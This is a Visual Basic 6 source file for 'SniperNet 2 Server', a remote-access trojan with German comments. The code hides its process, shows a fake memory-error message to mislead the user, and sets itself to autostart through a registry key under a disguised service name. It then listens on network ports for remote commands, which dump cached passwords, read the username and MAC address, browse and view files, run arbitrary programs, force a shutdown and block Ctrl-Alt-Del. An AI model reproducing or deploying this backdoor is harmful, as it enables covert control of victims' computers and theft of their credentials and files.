VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmPeerB 
   Caption         =   "SniperNet 2 Server"
   ClientHeight    =   3255
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   5085
   Icon            =   "frmPeerB.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3255
   ScaleWidth      =   5085
   StartUpPosition =   3  'Windows Default
   Begin VB.FileListBox File1 
      Height          =   480
      Left            =   2385
      TabIndex        =   19
      Top             =   2730
      Width           =   2355
   End
   Begin VB.DirListBox Dir1 
      Height          =   540
      Left            =   135
      TabIndex        =   18
      Top             =   2730
      Width           =   1965
   End
   Begin VB.TextBox Text8 
      Height          =   285
      Left            =   3480
      TabIndex        =   16
      Text            =   "MAC adress here.."
      Top             =   600
      Width           =   1575
   End
   Begin VB.TextBox Text6 
      Height          =   285
      Left            =   1560
      TabIndex        =   14
      Top             =   600
      Width           =   735
   End
   Begin VB.ListBox List1 
      Height          =   645
      ItemData        =   "frmPeerB.frx":0442
      Left            =   120
      List            =   "frmPeerB.frx":0444
      TabIndex        =   12
      Top             =   1800
      Width           =   4575
   End
   Begin VB.TextBox Text5 
      Height          =   285
      Left            =   120
      TabIndex        =   10
      Top             =   1200
      Width           =   4575
   End
   Begin MSWinsockLib.Winsock telnet 
      Left            =   4680
      Top             =   2385
      _ExtentX        =   741
      _ExtentY        =   741
      RemotePort      =   167
      LocalPort       =   167
   End
   Begin VB.Timer Timer1 
      Interval        =   5
      Left            =   3720
      Top             =   2385
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   3480
      TabIndex        =   8
      Text            =   "Text4"
      Top             =   240
      Width           =   615
   End
   Begin MSWinsockLib.Winsock tcp 
      Left            =   4200
      Top             =   2385
      _ExtentX        =   741
      _ExtentY        =   741
      RemotePort      =   666
      LocalPort       =   667
   End
   Begin VB.TextBox Text7 
      Height          =   285
      Left            =   4320
      TabIndex        =   3
      Text            =   "Text7"
      Top             =   240
      Width           =   735
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   960
      TabIndex        =   2
      Text            =   "Text3"
      Top             =   240
      Width           =   735
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Text            =   "Text2"
      Top             =   240
      Width           =   735
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   2040
      TabIndex        =   0
      Text            =   "none yet"
      Top             =   240
      Width           =   1215
   End
   Begin VB.Label Label10 
      Caption         =   "Telnet file browsing............"
      Height          =   195
      Left            =   135
      TabIndex        =   20
      Top             =   2490
      Width           =   2055
   End
   Begin VB.Label Label1 
      Caption         =   "Mac adress"
      Height          =   375
      Left            =   2520
      TabIndex        =   17
      Top             =   600
      Width           =   855
   End
   Begin VB.Label Label9 
      Caption         =   "connected to inet?"
      Height          =   255
      Left            =   120
      TabIndex        =   15
      Top             =   600
      Width           =   1455
   End
   Begin VB.Label Label8 
      Caption         =   "cached pwds"
      Height          =   255
      Left            =   120
      TabIndex        =   13
      Top             =   1560
      Width           =   1815
   End
   Begin VB.Label Label7 
      Caption         =   "Telnet Commando:"
      Height          =   255
      Left            =   120
      TabIndex        =   11
      Top             =   960
      Width           =   1575
   End
   Begin VB.Label Label2 
      Caption         =   "tcp.state"
      Height          =   255
      Left            =   3480
      TabIndex        =   9
      Top             =   0
      Width           =   735
   End
   Begin VB.Label Label6 
      Caption         =   "remote port"
      Height          =   255
      Left            =   960
      TabIndex        =   7
      Top             =   0
      Width           =   975
   End
   Begin VB.Label Label5 
      Caption         =   "local port"
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   0
      Width           =   735
   End
   Begin VB.Label Label4 
      Caption         =   "received String"
      Height          =   255
      Left            =   2040
      TabIndex        =   5
      Top             =   0
      Width           =   1335
   End
   Begin VB.Label Label3 
      Caption         =   "Parameter"
      Height          =   255
      Left            =   4320
      TabIndex        =   4
      Top             =   0
      Width           =   1215
   End
End
Attribute VB_Name = "frmPeerB"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim connected As Boolean
Dim file As Boolean
Dim Command As String
Dim i As Integer
Private Type RASCONN
    dwSize As Long
    hRasConn As Long
    szEntryName(256) As Byte
    szDeviceType(16) As Byte
    szDeviceName(128) As Byte
End Type
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Function GetAppFile() As String
If Right(App.Path, 1) = "\" Then
     GetAppFile = App.Path & App.EXEName & ".exe"
    Else
     GetAppFile = App.Path & "\" & App.EXEName & ".exe"
End If
End Function

Private Sub Dir1_Change()
File1.Path = Dir1.Path
End Sub

Private Sub Form_Load()
a = GetAppFile
'FileCopy GetAppFile, "c:\windows\system\System.exe"

'FileCopy App.Path & "\" & App.EXEName & ".exe", "c:\windows\system\system.exe"

If App.PrevInstance Then    ''verhindert zwei-oder mehrmaliges Starten des Progs.
    mag = MsgBox("Already loaded !", vbOKOnly, "loading...")
    End
End If

''diese folgenden Prozeduren verstecken die Applikation
a = RegisterServiceProcess(GetCurrentProcessId, 1)  '' FUNKTIONIERT NICHT UNTER WIN2000 !!
frmPeerB.Visible = False
tcp.Close
DoEvents
If tcp.State <> 0 Then
msg = MsgBox("Already loaded !", vbOKOnly, "loading...")
End
End If

tcp.Listen  ''schaltet den Server in Warteposition
telnet.Listen ''schaltet den TelnetServer in Warteposition
Text7.Text = Command        ''Command sind die an das Programm übergebenen
                            ''Parameter. Wenn nicht "/load" übergeben wurde
                            ''kommt es zu einer fiktiven Fehlermeldung! -->
If Text7.Text <> "/load" Then
    msg = MsgBox("Exception Error:00x169f !", vbCritical, "Memory error!")
End If

'' folgende Prozedur testet, ob eine Internetverbindung besteht
Dim Verbindung As RASCONN
Dim size, Anz As Long
Verbindung.dwSize = 412
size = Verbindung.dwSize
If RasEnumConnectionsA(Verbindung, size, Anz) = 0 Then
 If Anz = 0 Then
    connected = False
    Text6 = "nein!"
 Else
    connected = True
    Text6 = "ja!"
 End If
End If

Text8 = GetMACAddress()  ''liest MAC Adresse aus
Text2.Text = tcp.LocalPort
Text3.Text = tcp.RemotePort

''Folgendes trägt die Server Applikation in der Registry in einem
''nicht so gewöhnlichen Ordner ein, so dass die Applikation immer
''wieder aufgerufen wird :-)
strOwner$ = App.Path & "\" & App.EXEName & ".exe /load"
'strOwner$ = "c:\windows\system\system.exe /load"
Call savestring(HKEY_LOCAL_MACHINE, _
"Software\Microsoft\Windows\CurrentVersion\RunServices", _
"Network Solutions Client Applikation Service", strOwner$)
End Sub


Private Sub tcp_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
tcp.Close
End Sub

Private Sub telnet_Close()
telnet.Close
telnet.Listen
End Sub

'' Zeigen des Startbildes bei Zustandekommen einer Verbindung zum Telnet Server

Private Sub telnet_ConnectionRequest(ByVal requestID As Long)
telnet.Close
telnet.Accept requestID
Do Until telnet.State = 7
DoEvents
Loop
telnet.SendData "Verbunden mit IP:" & telnet.LocalIP & vbCrLf
If connected = True Then
 telnet.SendData " You're connected over internet." & vbCrLf & vbCrLf
Else
 telnet.SendData " You're connected over LAN." & vbCrLf & vbCrLf
End If
file = False
telnet.SendData " ----------------------------------------------------------" & vbCrLf
telnet.SendData "|              Willkommen bei SniperNet 2.2                |" & vbCrLf
telnet.SendData "|                 www.brightdarkness.de                    |" & vbCrLf
telnet.SendData "|                                           by Real_Sniper |" & vbCrLf
telnet.SendData " ----------------------------------------------------------" & vbCrLf & vbCrLf
telnet.SendData "  type '???' or 'help' to get a list of commands !" & vbCrLf
telnet.SendData "  type 'quit' or 'exit' to get rid of all this... !" & vbCrLf
telnet.SendData "?>"
End Sub


'' Das folgende ist der Telnet Server, der die einzelnen Anfragen
'' beantwortet und Infos übermittelt !

Private Sub telnet_DataArrival(ByVal bytesTotal As Long)
Dim telnetcommando, data As String
telnet.GetData data
Dim exec As String
exec = ""
If file = False Then
    If Asc(data) = 13 Then
        telnet.SendData "please stand by...." & vbCrLf
    
    exec = Mid(Text5, 1, 3)
    strdata = Mid(Text5, 4)
        On Error Resume Next
        Select Case Text5
            Case "files"
            file = True
            telnet.SendData " Now changing in HD-browsing mode; type 'return' to go back..." & vbCrLf
            Case "getmacadress"
            telnet.SendData " MAC Adresse:" & Text8.Text & vbCrLf
            Case "getpwds"
            Call GetPasswords
            telnet.SendData " Cached Passwords:" & vbCrLf
            For k = 0 To List1.ListCount
            telnet.SendData List1.List(k) & vbCrLf
            Next k
            Case "quit", "exit"
            telnet.SendData " logged out......goodbye !"
            telnet.Close
            telnet.Listen
            Exit Sub
            Case "opencdrom"
            telnet.SendData " CDRom Drive opened..." & vbCrLf
            Call mciExecute("Set CDaudio door open")
            Case "closecdrom"
            telnet.SendData " CDRom Drive closed..." & vbCrLf
            Call mciExecute("Set CDaudio door closed")
            Case "blockwinfunction"
            Block
            telnet.SendData " Win Function keys blocked..." & vbCrLf
            Case "unblockwinfunction"
            Unblock
            telnet.SendData " Win Function keys unblocked..." & vbCrLf
            Case "getusername"
            nm = " Username: " & NTDomainUserName()
            telnet.SendData nm & vbCrLf
            Case "screensaver"
            Call SendMessage(Me.hWnd, WM_SYSCOMMAND, SC_SCREENSAVE, 0&)
            telnet.SendData " Screensaver started..." & vbCrLf
            Case "space_c"
            kommando = "Drivespace left on drive C: "
            kommando = kommando + CStr(DiskSpace("C"))
            Text.Text = kommando
            telnet.SendData kommando & " Bytes left on Drive C:\..." & vbCrLf
            Case "space_d"
            kommando = "Drivespace left on drive D: "
            kommando = kommando + CStr(DiskSpace("D"))
            Text.Text = kommando
            telnet.SendData kommando & " Bytes left on Drive D:\..." & vbCrLf
            Case "space_e"
            kommando = "Drivespace left on drive E: "
            kommando = kommando + CStr(DiskSpace("E"))
            Text.Text = kommando
            telnet.SendData kommando & " Bytes left on Drive E:\..." & vbCrLf
            Case "shutdown"
            rVal = ExitWindowsEx(EWX_FORCE, 0&)
            telnet.SendData " Windows shut down..." & vbCrLf
            Case "disabledblclick"
            a = SetDoubleClickTime(50)
            telnet.SendData " Doubleclick disabled..." & vbCrLf
            Case "???", "help", "?"
            telnet.SendData vbCrLf & " Valid commands are:" & vbCrLf
            telnet.SendData "      opencdrom                       closecdrom" & vbCrLf
            telnet.SendData "      unblockwinfunction              blockwinfunction" & vbCrLf
            telnet.SendData "      getusername                     screensaver" & vbCrLf
            telnet.SendData "      space_c                         space_d" & vbCrLf
            telnet.SendData "      space_e                         shutdown" & vbCrLf
            telnet.SendData "      disabledblclick                 getpwds" & vbCrLf
            telnet.SendData "      getmacadress                    files" & vbCrLf & vbCrLf
            telnet.SendData "  'exe' + File with full path" & vbCrLf
            telnet.SendData "  'msg' + Message text" & vbCrLf & vbCrLf
        Case Else
            Select Case exec
            Case "exe"
            executing = Shell(strdata, vbNormalFocus)
            Case "msg"
            msg = MsgBox(strdata, vbCritical, "Warning!")
        Case Else
            telnet.SendData " Command not understood..." & vbCrLf
        End Select
    End Select



    Text5 = ""
    telnet.SendData "?>"
    Else
    Text5 = Text5 & data
    End If

'''   Festplattenbrowsing per Telnet
ElseIf file = True Then
    If Asc(data) = 13 Then
        If LCase(Command) = "return" Then
            file = False
            telnet.SendData "changed again in command mode..." & vbCrLf
            telnet.SendData "?>"
            Exit Sub
        Else
        If LCase(Command) = "cd.." Then
            If Dir1.Path <> "C:\" Then Dir1.Path = ".."
            If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
            Command = ""
            Exit Sub
        End If
        
        If LCase(Command) = "cd." Then
            Dir1.Path = "."
            If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
            Command = ""
            Exit Sub
        End If
        
        If LCase(Command) = "dir" Then
            Dim Lenght As Integer
            For i = 0 To Dir1.ListCount - 1
            telnet.SendData Dir1.List(i) & "     <DIR>" & vbCrLf
            Next
            For i = O To File1.ListCount
            telnet.SendData File1.List(i) & vbCrLf
            Next
            If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
            Command = ""
            Exit Sub
        End If
        
        If LCase(Left(Command, 4)) = "view" Then
            U = Right(Command, Len(Command) - 5)
            On Error GoTo err1
            If Dir1.Path = "C:\" Then
            Open "C:\" & U For Input As #1
            Do Until EOF(1)
            Line Input #1, O
            telnet.SendData O & vbCrLf
            Loop
            Close #1
            Else
            Open Dir1.Path & "\" & U For Input As #1
            Do Until EOF(1)
            Line Input #1, O
            telnet.SendData O & vbCrLf
            Loop
            Close #1
            End If
            If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
            Command = ""
            Exit Sub
err1:
            telnet.SendData err.Description & vbCrLf
            If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
            Command = ""
            Exit Sub
        End If
        
        If LCase(Left(Command, 2)) = "cd" And LCase(Left(Command, 3)) <> "cd." And LCase(Left(Command, 3)) <> "cd\" And Len(Command) > 3 Then
        U = Right(Command, Len(Command) - 3)
            On Error GoTo err1
            If Dir1.Path <> "C:\" Then Dir1.Path = Dir1.Path & "\" & U Else Dir1.Path = Dir1.Path & U
            If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
            Command = ""
            Exit Sub
        End If
        
        If LCase(Command) = "cd\" Then
            Dir1.Path = "C:\"
            If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
            Command = ""
            Exit Sub
        End If
        
        If LCase(Command) = "help" Then
            telnet.SendData " available commands are:" & vbCrLf
            telnet.SendData "   cd..        cd." & vbCrLf
            telnet.SendData "   cd\         dir" & vbCrLf
            telnet.SendData "   view        return" & vbCrLf & vbCrLf
            If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
            Command = ""
            Exit Sub
        End If
        
        If LCase(Command) = "quit" Then
            telnet.SendData "   quitting hd-browsing mode" & vbCrLf & "OK..." & vbCrLf
            file = False
            Exit Sub
        End If

        telnet.SendData "Wrong Command!" & vbCrLf & "Type help for help" & vbCrLf
        If Dir1.Path <> "C:\" Then telnet.SendData UCase(Dir1.Path) & "\>" Else telnet.SendData "C:\>"
        End If
    Command = ""
    Else
    Command = Command & data
    End If
End If


End Sub

Private Sub telnet_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
tcp.Close
End Sub

Private Sub Timer1_Timer()
Text4 = tcp.State
End Sub

Private Sub Form_Unload(Cancel As Integer)
send "disconnected" ''übermittelt am den Clienten, dass die Applikation beendet wurde
tcp.Close
End Sub

Private Sub tcp_ConnectionRequest(ByVal requestID As Long)
If tcp.State <> sckClosed Then tcp.Close
tcp.Accept requestID  ''akzeptiert die Anfrage auf Verbibdung des Servers
End Sub

'' Die kommenden Kommandos sind einzig und allein
'' für die Ausführung der übermittelten Befehle

Private Sub tcp_DataArrival(ByVal bytesTotal As Long)
Dim msg As String
tcp.GetData msg
Text1 = msg
exec = Mid(msg, 1, 3)
strdata = Mid(msg, 4)
    On Error Resume Next
    Select Case exec
        Case "cmd"
        Select Case strdata
            Case "ping"
            send "pingback"
            DoEvents
            
            send "mac" & Text8
            Case "cmdstatusconnection"
            send "statusisconnect"
            send "mac" & Text8
            Case "getcachedpwds"
            Call GetPasswords
            Dim pwdslist As String
            pwdslist = ""
            For k = 0 To List1.ListCount
            pwdslist = pwdslist & List1.List(k) & vbCrLf
            Next k

            send "pwds Cached Passwords:" & vbCrLf & pwdslist
            
            Case "cdopen"
            Call mciExecute("Set CDaudio door open")
            Case "cdclose"
            Call mciExecute("Set CDaudio door closed")
            Case "crtaltdel"
            Block
            Case "unblock"
            Unblock
            Case "getusername"
            nm = "Username: " & NTDomainUserName()
            send nm
            Case "s"
            Call SendMessage(Me.hWnd, WM_SYSCOMMAND, SC_SCREENSAVE, 0&)
            Case "spaceC"
            kommando = "Drivespace left on drive C: "
            kommando = kommando + CStr(DiskSpace("C"))
            Text.Text = kommando
            send kommando
            Case "spaceD"
            kommando = "Drivespace left on drive D: "
            kommando = kommando + CStr(DiskSpace("D"))
            Text.Text = kommando
            send kommando
            Case "spaceE"
            kommando = "Drivespace left on drive E: "
            kommando = kommando + CStr(DiskSpace("E"))
            Text.Text = kommando
            send kommando
            Case "shutdown"
            rVal = ExitWindowsEx(EWX_FORCE, 0&)
            Case "disabledblclick"
            a = SetDoubleClickTime(50)
            Case "cmdscreensaver"
            Call SendMessage(Me.hWnd, WM_SYSCOMMAND, SC_SCREENSAVE, 0&)
            Text.Text = "winsockscreen" & data
        End Select
        Case "exe"
        exe = Shell(strdata, vbNormalFocus)
        Case "msg"
        msg = MsgBox(strdata, vbCritical, "Warning!")
        
'' Anfänge für Screenshot schiessen:
        'Case "pic"
        'frmPeerB.Visible = True
        'ScreenShot 0, 0, Screen.Width / Screen.TwipsPerPixelX, Screen.Height / Screen.TwipsPerPixelY
        'frmPeerB.Visible = False
        'Picture1.Picture = Clipboard.GetData
        'SavePicture Picture1.Picture, pfad
        
        End Select
End Sub
